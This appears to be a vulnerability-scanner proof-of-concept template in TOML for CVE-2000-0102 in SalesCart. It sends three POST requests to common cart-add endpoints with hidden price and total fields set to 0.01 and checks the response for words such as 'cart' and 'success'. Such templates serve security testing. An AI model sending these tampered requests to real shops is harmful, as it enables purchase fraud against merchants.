[info]
author = "AVE"
description = "通过发送特制 HTTP POST 请求修改购物车表单中的隐藏字段（price、total 等），验证 SalesCart 是否存在服务端未校验隐藏字段导致的价格篡改漏洞。攻击者无需认证即可通过修改表单中的隐藏 price/total 字段实现低价购买。"
id = "POC-AVE-2000-0086"
name = "SalesCart 隐藏表单字段篡改漏洞 PoC"
severity = "high"
tags = ["cve-2000-0102"]
vuln_id = [
    "CVE-2000-0102",
    "AVE-2000-0086",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/store/addtocart.asp"
protocol = "http"

[poc.requests.body]
content = "product_id=1&price=0.01&quantity=1&total=0.01"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "added",
    "cart",
    "success",
]

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/shoppingcart/cart_add.asp"
protocol = "http"

[poc.requests.body]
content = "item_id=1&price=0.01&quantity=1&total=0.01"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "added",
    "cart",
    "success",
]

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cart_add.asp"
protocol = "http"

[poc.requests.body]
content = "id=1&price=0.01&qty=1&total=0.01"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "added",
    "cart",
    "success",
]
